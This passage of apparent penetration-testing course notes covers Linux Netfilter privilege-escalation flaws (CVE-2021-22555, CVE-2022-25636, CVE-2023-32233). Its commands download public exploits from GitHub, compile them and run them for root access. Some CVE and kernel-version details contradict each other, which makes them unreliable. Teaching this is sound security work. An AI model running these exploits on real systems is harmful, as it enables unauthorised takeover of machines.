`Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules.

In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.

#### CVE-2021-22555

Vulnerable kernel versions: 2.6 - 5.11

```shell
cry0l1t3@ubuntu:~$ uname -r

5.10.5-051005-generic
```

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

gcc -m32 -static exploit.c -o exploit
./exploit
```

#### CVE-2022-25636
[CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/) and affects Linux kernel 5.4 through 5.6.10. This is `net/netfilter/nf_dup_netdev.c`, which can grant root privileges to local users due to heap out-of-bounds write
```bash
cry0l1t3@ubuntu:~$ uname -r

5.13.0-051300-generic
```

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git

cd CVE-2022-25636
make
./exploit
```

#### CVE-2023-32233
This vulnerability exploits the so called `anonymous sets` in `nf_tables` by using the `Use-After-Free` vulnerability in the Linux Kernel up to version `6.3.1`.
```bash
git clone https://github.com/Liuk3r/CVE-2023-32233

cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```